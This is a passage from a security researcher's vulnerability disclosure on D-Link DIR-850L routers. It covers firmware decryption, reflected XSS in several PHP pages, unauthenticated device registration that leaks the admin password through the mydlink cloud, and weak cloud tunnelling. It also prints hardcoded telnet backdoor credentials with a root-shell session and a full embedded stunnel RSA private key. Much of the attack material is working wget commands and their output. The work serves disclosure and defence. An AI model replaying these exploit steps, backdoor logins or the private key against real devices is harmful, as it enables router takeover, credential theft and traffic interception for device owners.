                        buffer[j] <span style="color: #666666">^=</span> (i <span style="color: #666666">+</span> j) <span style="color: #666666">%</span> <span style="color: #666666">0xFB</span> <span style="color: #666666">+</span> <span style="color: #666666">1</span>;
                        buffer[j] <span style="color: #666666">^=</span> key[(i <span style="color: #666666">+</span> j) <span style="color: #666666">%</span> kl];
                }
                write(fo, buffer, len);
                i <span style="color: #666666">+=</span> len;
        }

       <span style="color: #008000; font-weight: bold">return</span> (EXIT_SUCCESS);
}
</pre></div>

<p>You can use this program to decrypt firmware images:</p>
<pre><code>user@kali:~/petage-dlink$ ./revbdec DIR850L_REVB_FW207WWb05_h1ke_beta1.bin wrgac25_dlink.2013gui_dir850l &gt; DIR850L_REVB_FW207WWb05_h1ke_beta1.decrypted
user@kali:~/petage-dlink$ binwalk DIR850L_REVB_FW207WWb05_h1ke_beta1.decrypted

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             DLOB firmware header, boot partition: "dev=/dev/mtdblock/1"
593           0x251           LZMA compressed data, properties: 0x88, dictionary size: 1048576 bytes, uncompressed size: 65535 bytes
10380         0x288C          LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5184868 bytes
1704052       0x1A0074        PackImg section delimiter tag, little endian size: 10518016 bytes; big endian size: 8298496 bytes
1704084       0x1A0094        Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8296266 bytes, 2678 inodes, blocksize: 131072 bytes, created: 2017-01-20 06:39:29
</code></pre>
<p>The protection of the firmware images is non-existent.</p>
<p><a id="xss"></a></p>
<h2>Details - WAN &amp;&amp; LAN - revA - XSS</h2>
<p>Simply by analyzing PHP files inside <code>/htdocs/web</code>, we can discover several trivial XSS.</p>
<p>An attacker can use the XSS to target an authenticated user in order to steal the authentication cookies.</p>
<p><code>/htdocs/web/wpsacts.php</code>:</p>
<pre><code>user@kali:~/petage-dlink$ wget -qO- --post-data='action=&lt;a&gt;' http://ip:port/wpsacts.php
&lt;?xml version="1.0" encoding="utf-8"?&gt;
&lt;wpsreport&gt;
        &lt;action&gt;&lt;a&gt;&lt;/action&gt;
        &lt;result&gt;&lt;/result&gt;
        &lt;reason&gt;&lt;/reason&gt;
&lt;/wpsreport&gt;


user@kali:~/petage-dlink$ cat ./fs/htdocs/web/wpsacts.php
[..]
&lt;wpsreport&gt;
        &lt;action&gt;&lt;?echo $_POST["action"];?&gt;&lt;/action&gt;
[...]
</code></pre>
<p>XSS inside <code>/htdocs/web/shareport.php</code>:</p>
<pre><code>[...]
         &lt;action&gt;&lt;?echo $_POST["action"];?&gt;&lt;/action&gt;
[...]
</code></pre>
<p>XSS inside <code>/htdocs/web/sitesurvey.php</code>:</p>
<pre><code>[...]
        &lt;action&gt;&lt;?echo $_POST["action"];?&gt;&lt;/action&gt;
[...]
</code></pre>
<p>XSS inside <code>/htdocs/web/wandetect.php</code>:</p>
<pre><code>[...]
   &lt;action&gt;&lt;?echo $_POST["action"];?&gt;&lt;/action&gt;
[...]
</code></pre>
<p>XSS inside <code>/htdocs/web/wpsacts.php</code>:</p>
<pre><code>[...]
   &lt;action&gt;&lt;?echo $_POST["action"];?&gt;&lt;/action&gt;
[...]
</code></pre>
<p><a id="rce-mydlink"></a></p>
<h2>Details - WAN &amp;&amp; LAN - revB - Retrieving admin password, gaining full access using the custom mydlink Cloud protocol</h2>
<h3><strong>DISCLAIMER: Beware, no request has been sent directly to any servers operated by Dlink or other companies. All internet network traffic shown below is legitimate and produced by Dlink itself, or by products of Dlink (Dlink Cloud, Dlink browser extensions, Dlink 850L). All the findings exposed below were discovered without exceeding Dlink terms of use. This simply demonstrates how much broken this service is at the time of writing (run away!).</strong></h3>
<p>The webpage <code>http://ip_of_router/register_send.php</code> doesn't check the authentication of the user, thus an attacker can abuse this webpage to gain control of the device.
This webpage is used to register the device to the myDlink cloud infrastructure.</p>
<h3>Attack scenario:</h3>
<p>o The attacker will use the unauthenticated <code>/register_send.php</code> webpage to:</p>
<ol>
<li>
<p>create a MyDlink Cloud account,</p>
</li>
<li>
<p>signin the device to this account,</p>
</li>
<li>
<p>add the device to this account (the device will pass admin password to the Cloud platform! Meaning the passwords are stored in cleartext).</p>
</li>
</ol>
<p>o The attacker will then visit <a href="http://www.mydlink.com/">Dlink mycloud webpage</a> using a classic browser (i.e.: <a href="https://ftp.mozilla.org/pub/firefox/releases/50.0/win32/en-US/Firefox%20Setup%2050.0.exe">Firefox 50</a> and install the official Dlink NPAPI extension (this will not work with Firefox &gt; 50 or any recent version of Chrome since this plugin requires unsandboxed NPAPI support). This webpage will allow the attacker to remotely control the device (reboot, general management...).</p>
<p>o Then, using <code>Firefox dev tools</code>, the attacker can passively analyze the default HTTP requests/responses from the Dlink APIs on <a href="https://www.mydlink.com/">www.mydlink.com</a>:
The dlink cloud interface will <strong>leak by default</strong> the password of the device (!) inside the answer of a <code>PUT</code> request (and inside <code>GET</code> requests too). <strong>Just by watching the HTTP requests from the NPAPI plugin, the APIs will provide passwords of the device in cleartext.</strong></p>
<p>o Finally, the NPAPI plugins will automatically establish a tunnel between the router and the Firefox browser:
the attacker will be able to visit <code>http://127.0.0.1:dynamicaly_generated_remote_port/</code> to reach the remote router.
The traffic will go directly to Amazon servers then to the remote Dlink router:</p>
<pre><code>Firefox NPAPI client (http://127.0.0.1:remote_port/)   -&gt;    Amazon   -&gt;    Dlink 850L HTTP Interface.
</code></pre>
<p>o The attacker will use the previous password provided by the legit HTTPS answers from the Dlink APIs and will be able to login inside the router.
<strong>At that point complete control over the router is achieved.</strong></p>
<p>o This is made possible by the <code>signalc</code> program (inside <code>/mydlink/</code>) that creates a TCP tunnel to Amazon servers.</p>
<p>Finally, I will demonstrate some part of the traffic inside this tunnel is in cleartext and the other part (encrypted traffic) can be MITM'd
thanks to self-signed certificates and the complete lack of certificate verification.</p>
<h3>Let's resume the attack:</h3>
<p>The PHP script hosted at <code>http://ip_of_router/register_send.php</code> will serve as a proxy between the attacker and the remote Dlink APIs.
This page will also retrieve the password (<strong>it is stored in cleartext</strong> - see <a href="#cleartext-passwords">part 8. Weak files permission and credentials stored in cleartext</a>) and send it to remote Dlink APIs.</p>
<pre><code>151 $devpasswd = query("/device/account/entry/password"); &lt;- $devpasswd contains the password
152 $action = $_POST["act"];                                 of the device
</code></pre>
<p>The password will be sent during the association of the device (3rd request : <code>adddev</code>) to the Mydlink Cloud service (see the <code>&amp;device_password=$devpasswd</code>):</p>
<pre><code>178 //sign up
179 $post_str_signup = "client=wizard&amp;wizard_version=" .$wizard_version. "&amp;lang=" .$_POST["lang"].
180                    "&amp;action=sign-up&amp;accept=accept&amp;email=" .$_POST["outemail"]. "&amp;password=" .$_POST["passwd"].
181                    "&amp;password_verify=" .$_POST["passwd"]. "&amp;name_first=" .$_POST["firstname"]. "&amp;name_last=" .$_POST["lastname"]." ";
182 
183 $post_url_signup = "/signin/";
184 
185 $action_signup = "signup";
186 
187 //sign in       
188 $post_str_signin = "client=wizard&amp;wizard_version=" .$wizard_version. "&amp;lang=" .$_POST["lang"].
189             "&amp;email=" .$_POST["outemail"]. "&amp;password=" .$_POST["passwd"]." ";
190 
191 $post_url_signin = "/account/?signin";
192 
193 $action_signin = "signin";
194 
195 //add dev (bind device)
196 $post_str_adddev = "client=wizard&amp;wizard_version=" .$wizard_version. "&amp;lang=" .$_POST["lang"].
197             "&amp;dlife_no=" .$mydlink_num. "&amp;device_password=" .$devpasswd. "&amp;dfp=" .$dlinkfootprint." ";
198 
199 $post_url_adddev = "/account/?add";
200 
201 $action_adddev = "adddev";
202 
203 //main start
204 if($action == $action_signup)                    &lt;---- first request
205 {
206         $post_str = $post_str_signup;
207         $post_url = $post_url_signup;
208         $withcookie = "";   //signup dont need cookie info
209 }
210 else if($action == $action_signin)               &lt;---- second request
211 {
212         $post_str = $post_str_signin;
213         $post_url = $post_url_signin;
214         $withcookie = "\r\nCookie: lang=en; mydlink=pr2c11jl60i21v9t5go2fvcve2;";
215 }
216 else if($action == $action_adddev)               &lt;---- 3rd request
217 {
218         $post_str = $post_str_adddev;
219         $post_url = $post_url_adddev;
220 }
</code></pre>
<p>To exploit this vuln, let's create 3 HTTP requests to the dlink router:</p>
<p>The first one (<code>signup</code>) will create an user on the MyDlink service:</p>
<pre><code>user@kali:~/petage-dlink$ wget -qO- --user-agent="" --post-data 'act=signup&amp;lang=en&amp;outemail=MYEMAIL@GMAIL.COM&amp;passwd=SUPER_PASSWORD&amp;firstname=xxxxxxxx&amp;lastname=xxxxxxxx' http://ip/register_send.php

&lt;?xml version="1.0"?&gt;
&lt;register_send&gt;
   &lt;result&gt;success&lt;/result&gt;
   &lt;url&gt;http://mp-us-portal.auto.mydlink.com&lt;/url&gt;
&lt;/register_send&gt;
</code></pre>
<p>Internally, this request was crafted and sent to MyDlink Cloud APIs:</p>
<pre><code>179 $post_str_signup = "client=wizard&amp;wizard_version=" .$wizard_version. "&amp;lang=" .$_POST["lang"].
180                    "&amp;action=sign-up&amp;accept=accept&amp;email=" .$_POST["outemail"]. "&amp;password=" .$_POST["passwd"].
181                    "&amp;password_verify=" .$_POST["passwd"]. "&amp;name_first=" .$_POST["firstname"]. "&amp;name_last=" .$_POST["lastname"]." ";
</code></pre>
<p>The second one (<code>signin</code>) will "signin" the newly created user - the router will be associated with this account - but not activated:</p>
<pre><code>user@kali:~/petage-dlink$ wget -qO- --user-agent="" --post-data 'act=signin&amp;lang=en&amp;outemail=MYEMAIL@GMAIL.COM&amp;passwd=SUPER_PASSWORD&amp;firstname=xxxxxxxx&amp;lastname=xxxxxxxx' http://ip/register_send.php

&lt;?xml version="1.0"?&gt;
&lt;register_send&gt;
  &lt;result&gt;success&lt;/result&gt;
  &lt;url&gt;http://mp-us-portal.auto.mydlink.com&lt;/url&gt;
&lt;/register_send&gt;
</code></pre>
<p>Internally, this request was crafted and sent to MyDlink Cloud APIs:</p>
<pre><code>188 $post_str_signin = "client=wizard&amp;wizard_version=" .$wizard_version. "&amp;lang=" .$_POST["lang"].
189             "&amp;email=" .$_POST["outemail"]. "&amp;password=" .$_POST["passwd"]." ";
</code></pre>
<p>The last one will associate the device to the dlink service and will send the password of the device to the remote APIs of Dlink:</p>
<pre><code>user@kali:~/petage-dlink$ wget -qO- --user-agent="" --post-data 'act=adddev&amp;lang=en' http://ip/register_send.php

&lt;?xml version="1.0"?&gt;
&lt;register_send&gt;
  &lt;result&gt;success&lt;/result&gt;
  &lt;url&gt;http://mp-us-portal.auto.mydlink.com&lt;/url&gt;
&lt;/register_send&gt;
</code></pre>
<p>Internally, this request was crafted and sent to MyDlink Cloud APIs:</p>
<pre><code>196 $post_str_adddev = "client=wizard&amp;wizard_version=" .$wizard_version. "&amp;lang=" .$_POST["lang"].
197             "&amp;dlife_no=" .$mydlink_num. "&amp;device_password=" .$devpasswd. "&amp;dfp=" .$dlinkfootprint." ";
</code></pre>
<p>Now please confirm the email using the email sent from Dlink: </p>
<p><img src="images/2017-dlink-000-activation-email.png" width="140%" height="140%"></p>
<p>Then, visit <a href="http://mydlink.com/">http://mydlink.com/</a> and login using the email and the password.</p>
<p>You will see the device listed in the web interface (You need to install the plugin - you can use "IE8 - Win7.ova" from Microsoft, you need Firefox 50 to use the plugin).</p>
<p>Please see the attached screenshot to see the available management options (you can click on the images):</p>
<p><a href="images/2017-dlink-001-webpage.png" target="_blank"><img src="images/2017-dlink-001-webpage.png" width="100%" height="100%"></a></p>
<p><a href="images/2017-dlink-002-webpage.png" target="_blank"><img src="images/2017-dlink-002-webpage.png" width="100%" height="100%"></a></p>
<p><a href="images/2017-dlink-003-webpage.png" target="_blank"><img src="images/2017-dlink-003-webpage.png" width="100%" height="100%"></a></p>
<p><a href="images/2017-dlink-004-webpage.png" target="_blank"><img src="images/2017-dlink-004-webpage.png" width="100%" height="100%"></a></p>
<p>By analyzing the requests, we can get more information about the targeted router (note the requests are made <strong>by default</strong> when browsing the www.mydlink.com website!):</p>
<p><a href="images/2017-dlink-005-dev-tools.png" target="_blank"><img src="images/2017-dlink-005-dev-tools.png"></a></p>
<p>It appears the <code>PUT</code> (<code>PUT IDENTIFIER_OF_THE_ROUTER</code>) request provides a response with the cleartext password of the device!</p>
<p><a href="images/2017-dlink-006-dev-tools.png" target="_blank"><img src="images/2017-dlink-006-dev-tools.png"></a></p>
<p>Note that there is a <code>GET</code> request on the end of the image, we will study it too.</p>
<pre><code>https://eu.mydlink.com/device/devices/DEVICEID?_=SOME_RANDOM_DATA&amp;access_token=ACCESS_TOKEN
</code></pre>
<p>The <code>POST</code> data are:</p>
<pre><code>{"id":"EDITED_DEVICE_ID","order":0,"mac":"EDITED_MAC_ADDRESS","model":"DIR-850L","ddnsServer":"eu.mydlink.com","activatedDate":"EDITED_ACTIVATION_DATE","hwVer":"B1","selected":true,"defaultIconUrl":"https://d3n8c69ydsbj5n.cloudfront.net/Product/Pictures/DIR-850L/DIR-850L_default.gif","type":"router","series":"","name":"","authKey":"","status":"","adminPassword":"","plainPassword":"","fwUpgrade":false,"fwVer":"","provVer":"","binded":true,"registered":null,"supportHttps":null,"signalAddr":"","features":[],"serviceCnvr":{"enabled":false,"plan":"","space":0,"expireTime":0,"contentValidThru":0},"serviceLnvr":{"targetStorageId":null,"targetStorageVolumeId":null},"added2UniPlugin":false,"connections":[{"id":"http","scheme":"http","tunnel":null,"ip":null,"port":null},{"id":"httpWithCredential","scheme":"http","tunnel":null,"ip":null,"port":null},{"id":"https","scheme":"https","tunnel":null,"ip":null,"port":null},{"id":"httpsWithCredential","scheme":"https","tunnel":null,"ip":null,"port":null},{"id":"liveview","scheme":"","tunnel":null,"ip":null,"port":null},{"id":"playback","scheme":"","tunnel":null,"ip":null,"port":null},{"id":"config","scheme":"","tunnel":null,"ip":null,"port":null}]}
</code></pre>
<p>The answer is, in cleartext (<strong>and contains the password of the device</strong>):</p>
<pre><code>{"name":"DIR-850L","status":"online","authKey":"EDITED","adminPassword":"password","plainPassword":"password","fwUpgrade":false,"fwVer":"2.07","provVer":"2.0.18-b04","binded":true,"registered":true,"supportHttps":true,"signalAddr":"mp-eu-signal.auto.mydlink.com","features":[1,2,3,4,28,29],"serviceCnvr":{"enabled":false,"plan":"","space":0,"expireTime":0,"contentValidThru":0},"serviceLnvr":{"targetStorageId":null,"targetStorageVolumeId":null}}
</code></pre>
<p>A <code>GET</code> request is done too (the last one on the previous image), which allows to retrieve the password and the previous one (was changed in the router to confirm this fact):</p>
<p><a href="images/2017-dlink-get-password.png" target="_blank"><img src="images/2017-dlink-get-password.png"></a></p>
<p>The request is:</p>
<pre><code>GET https://eu.mydlink.com/device/devices/DEVICE_ID?_=RANDOM_NUMBER&amp;access_token=ACCESS_TOKEN HTTP/1.1
</code></pre>
<p>And the answer is the same, with the previous password (plainPassword) and the new password (adminPassword):</p>
<pre><code>{"name":"DIR-850L","status":"online","authKey":"EDITED","adminPassword":"password","plainPassword":"PASSWORD","fwUpgrade":false,"fwVer":"2.07","provVer":"2.0.18-b04","binded":true,"registered":true,"supportHttps":true,"signalAddr":"mp-eu-signal.auto.mydlink.com","features":[1,2,3,4,28,29],"serviceCnvr":{"enabled":false,"plan":"","space":0,"expireTime":0,"contentValidThru":0},"serviceLnvr":{"targetStorageId":null,"targetStorageVolumeId":null}}
</code></pre>
<p>Finally, a request is made from the NPAPI plug-in asking for a tunnel between the browser and the remote router:</p>
<p><a href="images/2017-dlink-007-dev-tools.png" target="_blank"><img src="images/2017-dlink-007-dev-tools.png"></a></p>
<p>The request to <code>/tssm/tssml.php</code> will ask the remote Cloud platform to forward the traffic to the device number 3XXXXXXX.
This will provide the attacker information about the new-established TCP tunnel from the browser NPAPI extension to the DLINK 850L router, via the Cloud platform:</p>
<pre><code>https://eu.mydlink.com/tssm/tssml.php?id=EDITED&amp;no=EDITED_DEVICE_ID&amp;type=1&amp;state=3&amp;status=1&amp;ctype=4&amp;browser=Mozilla/5.0+(Windows+NT+6.1;+rv:50.0)+Gecko/20100101+Firefox/50.0&amp;message=[{"service":"http","scheme":"http","tunnel":"relay","ip":"127.0.0.1","port":50453},{"service":"https","scheme":"https","tunnel":"relay","ip":"127.0.0.1","port":50454}]&amp;_=EDITED_RANDOM_VALUE
</code></pre>
<p>It appears the plugin listens on <code>127.0.0.1:50453/tcp</code> (HTTP) and <code>127.0.0.1:50454/tcp</code> (HTTP over SSL) as shown below:</p>
<p><a href="images/2017-dlink-008-cmd.png" target="_blank"><img src="images/2017-dlink-008-cmd.png"></a></p>
<p>Ok, let's browse <code>http://127.0.0.1:50453/</code>. The traffic is sent to the remote router over the Cloud protocol.</p>
<p><a href="images/2017-dlink-009-router.png" target="_blank"><img src="images/2017-dlink-009-router.png" width="100%" height="100%"></a></p>
<p>By using the password leak found before (in the <code>PUT</code> and <code>GET</code> requests), the attacker can remotely pwn the router and update the firmware with a custom (backdoored) one:</p>
<p><a href="images/2017-dlink-010-router.png" target="_blank"><img src="images/2017-dlink-010-router.png" width="100%" height="100%"></a></p>
<h1>MISSION COMPLETE.</h1>
<p>These vulnerabilities may affect some Dlink NAS/routers/cameras.</p>
<p>On a side note, it is interesting to find that DLink is storing all the passwords of devices using the mydlink service in cleartext.</p>
<p><a id="mydlink-cloud-protocol"></a></p>
<h2>Details - WAN - revA and revB - Weak Cloud protocol</h2>
<p>The MyDlink Cloud protocol is weak. No encryption is provided by default by this technology, it is only a basic TCP relay system.
All the traffic is sent over TCP to remote Amazon server without proper encryption:</p>
<p><a href="images/2017-wireshark-54.194.162.84.2048-tcp.png" target="_blank"><img src="images/2017-wireshark-54.194.162.84.2048-tcp.png" width="100%" height="100%"></a></p>
<p>There are 2 TCP relays:</p>
<ul>
<li>one with the HTTP server of the dlink router as an endpoint</li>
<li>the other one with the HTTPS server of the dlink router as an endpoint.</li>
</ul>
<p>So, it appears, the router is reachable over this TCP tunnel using either HTTP and HTTPS.
By default, you can see HTTP request AND HTTPS request from the browser (over the tunnel) to the router.
About the HTTPS requests, the SSL certificate provided by the router is self-signed. Sus, an invalid certificate can be forged and used in order to successful MITM the device and intercept information. More, by default, a TCP relay for HTTP is made by the NPAPI plugin to the router as shown above.</p>
<p>Futhermore, the <code>/mydlink/signalc</code> program running inside the router uses the MAC address of the device to get an unique identifier,
which will always be the same, even if the dlink device is reset or linked with a new dlink cloud account.
This allows Dlink to 'follow' the ownership of the device.</p>
<p>Hopefully, an user can change the MAC addresses of the device using the <code>rgbin</code> binary (<code>/usr/sbin/devdata</code> is a symlink to <code>/usr/sbin/rgbin</code> and the used argv[0] must be <code>devdata</code> to work):</p>
<pre><code># /usr/sbin/devdata dump # will dump all the configuration
# /usr/sbin/devdata set -e lanmac=00:11:22:33:44:55 # will define a new mac address for the lan interface
</code></pre>
<p>This program will only rewrite information over <code>/dev/mtdblock/4</code>.</p>
<p><strong>Finally, the mydlink interface allows the user to enter credentials for gmail/hotmail accounts, the credentials are then transfered to the routers using the tunnel established with the cloud protocol.
It doesn't seem to be a good idea, as the traffic between the router and the Cloud platform is not encrypted or encrypted using a self-signed certificate without verification and the passwords are sent over this tunnel using the Internet.</strong></p>
<p>These vulnerabilities may affect some Dlink NAS/routers/cameras (every device that supports the MyDlink cloud protocol).</p>
<p>Some wireshark (cleartext traffic and with self-signed certificate):</p>
<p><a href="images/2017-dlink-cloud-cleartext.png" target="_blank"><img src="images/2017-dlink-cloud-cleartext.png"></a></p>
<p><a href="images/2017-dlink-cloud-ssl.png" target="_blank"><img src="images/2017-dlink-cloud-ssl.png"></a></p>
<p><a id="backdoor"></a></p>
<h2>Details - LAN - revB - Backdoor access</h2>
<p>On revB, if you reset the device, the <code>/etc/init0.d/S80mfcd.sh</code> init script will start the <code>mfcd</code> binary with these arguments:</p>
<pre><code>mfcd -l /usr/sbin/login -u Alphanetworks:$image_sign -i br0 &amp;
</code></pre>
<p><code>mfcd</code> is in fact a telnetd server. the <code>-u</code> flag defines the authorized user with the associated password (<code>$image_sign</code> variable). </p>
<p><code>br0</code> is a bridge for these interfaces: <code>eth0</code>, <code>peth0</code>, <code>wlan0</code> et <code>wlan1</code>. This backdoor access can be only used from the LAN side.</p>
<pre><code>user@kali:~/petage-dlink$ cat fs/etc/init0.d/S80mfcd.sh
#!/bin/sh
echo [$0]: $1 ... &gt; /dev/console
orig_devconfsize=`xmldbc -g /runtime/device/devconfsize` 
entn=`devdata get -e ALWAYS_TN`
if [ "$1" = "start" ] &amp;&amp; [ "$entn" = "1" ]; then
        mfcd -i br0 -t 99999999999999999999999999999 &amp;
        exit
fi

if [ "$1" = "start" ] &amp;&amp; [ "$orig_devconfsize" = "0" ]; then

        if [ -f "/usr/sbin/login" ]; then
                image_sign=`cat /etc/config/image_sign`
                mfcd -l /usr/sbin/login -u Alphanetworks:$image_sign -i br0 &amp;
        else
                mfcd &amp;
        fi 
else
        killall mfcd
fi
</code></pre>
<p>By using the login <code>Alphanetworks</code> and the password <code>wrgac25_dlink.2013gui_dir850l</code>, the attacker can get a root shell on the device:</p>
<pre><code>user@kali:~/petage-dlink$ telnet 192.168.0.1
Trying 192.168.0.1...
Connected to 192.168.0.1.
Escape character is '^]'.
Login: Alphanetworks
Password: wrgac25_dlink.2013gui_dir850l


BusyBox v1.14.1 (2017-01-20 14:35:27 CST) built-in shell (msh)
Enter 'help' for a list of built-in commands.

# echo what
what
#
</code></pre>
<p><a id="keys"></a></p>
<h2>Details - WAN &amp;&amp; LAN - revA and revB - Stunnel private keys</h2>
<p>Keys are hardcoded inside the firmware. The administration can be used using HTTPS. This allows an attacker to do SSL MITM:</p>
<pre><code># ls -la /etc/stunnel.key
-rwxr-xr-x    1 root     root         1679 Jan 20  2017 /etc/stunnel.key
# cat /etc/stunnel.key
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAo/0bZcpc3Npc89YiNcP+kPxhLCGLmYXR4rHLt2I1BbnkXWHk
MY1Umfq9FAzBYSvPYEGER4gYq467yvp5wO97CUoTSJHbJDPnp9REj6wLcMkG7R9O
g8/WuQ3hsoexPu4YkjJXPhtQ6YkV7seEDgP3C2TNqCnHdXzqSs7+vT17chwu8wau
j/VMVZ2FRHU63JQ9DG6PqcudHTW+T/KVnmWXQnspgr8ZMhXobETtdqtRPtxbA8mE
ZeF8+cIoA9VcqP09/VMBbRm+o5+Q4hjtvSrv+W2bEd+BDU+V45ZX8ZfPoEWYjQqI
kv7aMECTIX2ebgKsjCK3PfYUX5PYbVWUV+176wIDAQABAoIBAQCQR/gcBgDQO7t+
uc9dmLTYYYUpa9ZEW+3/U0kWbuyRvi1DUAaS5nMiCu7ivhpCYWZSnTJCMWbrQmjN
vLT04H9S+/6dYd76KkTOb79m3Qsvz18tr9bHuEyGgsUp66Mx6BBsSKhjt2roHjnS
3W29WxW3y5f6NdAM+bu12Ate+sIq8WHsdU0hZD+gACcCbqrt4P2t3Yj3qA9OzzWb
b9IMSE9HGWoTxEp/TqbKDl37Zo0PhRlT3/BgAMIrwASb1baQpoBSO2ZIcwvof31h
IfrbUWgTr7O2Im7OiiL5MzzAYBFRzxJsj15mSm3/v3cZwK3isWHpNwgN4MWWInA1
t39bUFl5AoGBANi5fPuVbi04ccIBh5dmVipy5IkPNhY0OrQp/Ft8VSpkQDXdWYdo
MKF9BEguIVAIFPQU6ndvoK99lMiWCDkxs2nuBRn5p/eyEwnl2GqrYfhPoTPWKszF
rzzJSBKoStoOeoRxQx/QFN35/LIxc1oLv/mFmZg4BqkSmLn6HrFq2suVAoGBAMG1
CqmDs2vU43PeC6G+51XahvRI3JOL0beUW8r882VPUPsgUXp9nH3UL+l9/cBQQgUC
n12osLOAXhWDJWvJquK9HxkZ7KiirNX5eJuyBeaxtOSfBJEKqz/yGBRRVBdBHxT2
a1+gO0MlG6Dtza8azl719lr8m6y2O9pyIeUewUl/AoGAfNonCVyls0FwL57n+S2I
eD3mMJtlwlbmdsI1UpMHETvdzeot2JcKZQ37eIWyxUNSpuahyJqzTEYhf4kHRcO/
I0hvAe7UeBrLYwlZquH+t6lQKee4km1ULcWbUrxHGuX6aPBDBkG+s75/eDyKwpZA
S0RPHuUv2RkQiRtxsS3ozB0CgYEAttDCi1G82BxHvmbl23Vsp15i19KcOrRO7U+b
gmxQ2mCNMTVDMLO0Kh1ESr2Z6xLT/B6Jgb9fZUnVgcAQZTYjjXKoEuygqlc9f4S/
C1Jst1koPEzH5ouHLAa0KxjGoFvZldMra0iyJaCz/qHw6T4HXyALrbuSwOIMgxIM
Y00vZskCgYAuUwhDiJWzEt5ltnmYOpCMlY9nx5qJnfcSOld5OHZ0kUsRppKnHvHb
MMVyCTrp1jiH/o9UiXrM5i79fJBk7NT7zqKdI0qmKTQzNZhmrjPLCM/xEwAXtQMQ
1ldI69bQEdRwQ1HHQtzVYgKA9XCmvrUGXRq6E5sp2ky+X1QabC7bIg==
-----END RSA PRIVATE KEY-----
# cat /etc/stunnel_cert.pem
Certificate:
Data:
    Version: 3 (0x2)
    Serial Number:
        87:6f:88:76:87:df:e7:78
    Signature Algorithm: sha1WithRSAEncryption
    Issuer: C=TW, ST=Taiwan, O=None, OU=None, CN=General Root CA/emailAddress=webmaster@localhost
    Validity
        Not Before: Feb 22 06:04:36 2012 GMT
        Not After : Feb 17 06:04:36 2032 GMT
    Subject: C=TW, ST=Taiwan, L=HsinChu, O=None, OU=None, CN=General Router/emailAddress=webmaster@localhost
    Subject Public Key Info:
        Public Key Algorithm: rsaEncryption
            Public-Key: (2048 bit)
            Modulus:
                00:a3:fd:1b:65:ca:5c:dc:da:5c:f3:d6:22:35:c3:
                fe:90:fc:61:2c:21:8b:99:85:d1:e2:b1:cb:b7:62:
                35:05:b9:e4:5d:61:e4:31:8d:54:99:fa:bd:14:0c:
                c1:61:2b:cf:60:41:84:47:88:18:ab:8e:bb:ca:fa:
                79:c0:ef:7b:09:4a:13:48:91:db:24:33:e7:a7:d4:
                44:8f:ac:0b:70:c9:06:ed:1f:4e:83:cf:d6:b9:0d:
                e1:b2:87:b1:3e:ee:18:92:32:57:3e:1b:50:e9:89:
                15:ee:c7:84:0e:03:f7:0b:64:cd:a8:29:c7:75:7c:
                ea:4a:ce:fe:bd:3d:7b:72:1c:2e:f3:06:ae:8f:f5:
                4c:55:9d:85:44:75:3a:dc:94:3d:0c:6e:8f:a9:cb:
                9d:1d:35:be:4f:f2:95:9e:65:97:42:7b:29:82:bf:
                19:32:15:e8:6c:44:ed:76:ab:51:3e:dc:5b:03:c9:
                84:65:e1:7c:f9:c2:28:03:d5:5c:a8:fd:3d:fd:53:
                01:6d:19:be:a3:9f:90:e2:18:ed:bd:2a:ef:f9:6d:
                9b:11:df:81:0d:4f:95:e3:96:57:f1:97:cf:a0:45:
                98:8d:0a:88:92:fe:da:30:40:93:21:7d:9e:6e:02:
                ac:8c:22:b7:3d:f6:14:5f:93:d8:6d:55:94:57:ed:
                7b:eb
            Exponent: 65537 (0x10001)
    X509v3 extensions:
        X509v3 Basic Constraints: 
            CA:FALSE
        Netscape Comment: 
            OpenSSL Generated Certificate
        X509v3 Subject Key Identifier: 
            B5:BF:D1:A5:D6:6F:20:B0:89:1F:A6:C1:58:05:31:B2:B3:D0:C1:01
        X509v3 Authority Key Identifier: 
            keyid:5D:F8:E9:B5:F1:57:A4:90:94:BB:9F:DB:F7:91:95:E7:1C:A2:E7:D2

Signature Algorithm: sha1WithRSAEncryption
    3d:09:22:d0:a6:7d:9c:cd:bd:5b:ad:62:c2:6a:29:12:d1:61:
    88:ca:1e:68:1d:04:dd:40:fb:a9:d3:9f:22:49:dc:fa:fb:3c:
    21:dd:45:a5:53:1a:9b:80:ee:50:16:a6:36:3a:3c:f0:39:27:
    e4:8d:70:20:03:73:7f:26:65:ac:ab:05:b1:84:ee:7c:16:43:
    ca:2f:b5:6b:44:fc:75:a1:c7:86:04:18:b4:df:b2:76:f3:88:
    fb:dc:ec:99:3d:fe:d1:7c:ea:fa:56:eb:0b:d5:69:84:48:3d:
    12:db:d1:ef:f9:89:b0:62:70:ec:be:dd:e6:ef:dd:88:cf:f4:
    e5:ff:1d:88:d5:e0:23:f0:bb:a3:df:8e:8a:05:ea:f3:dc:14:
    49:2d:46:4a:27:40:a6:fc:70:4a:f5:94:3f:94:64:d1:93:7b:
    03:12:75:67:30:ee:8c:07:e1:73:77:00:23:d6:68:20:07:7f:
    8f:4e:1d:e8:76:87:0d:4c:26:f6:56:84:e2:56:98:a0:6c:ad:
    71:21:23:a4:a6:3b:b9:8e:27:13:c2:ae:70:0f:6a:c6:be:b8:
    88:9a:0a:d7:00:39:3a:90:7e:5f:4d:22:88:4e:a6:8a:2f:42:
    b4:dc:18:a4:eb:fa:f1:04:0e:a7:e2:ff:5d:ac:cd:61:28:01:
    7e:d3:01:13
-----BEGIN CERTIFICATE-----
MIIEBDCCAuygAwIBAgIJAIdviHaH3+d4MA0GCSqGSIb3DQEBBQUAMHoxCzAJBgNV
BAYTAlRXMQ8wDQYDVQQIDAZUYWl3YW4xDTALBgNVBAoMBE5vbmUxDTALBgNVBAsM
BE5vbmUxGDAWBgNVBAMMD0dlbmVyYWwgUm9vdCBDQTEiMCAGCSqGSIb3DQEJARYT
d2VibWFzdGVyQGxvY2FsaG9zdDAeFw0xMjAyMjIwNjA0MzZaFw0zMjAyMTcwNjA0
MzZaMIGLMQswCQYDVQQGEwJUVzEPMA0GA1UECAwGVGFpd2FuMRAwDgYDVQQHDAdI
c2luQ2h1MQ0wCwYDVQQKDAROb25lMQ0wCwYDVQQLDAROb25lMRcwFQYDVQQDDA5H
ZW5lcmFsIFJvdXRlcjEiMCAGCSqGSIb3DQEJARYTd2VibWFzdGVyQGxvY2FsaG9z
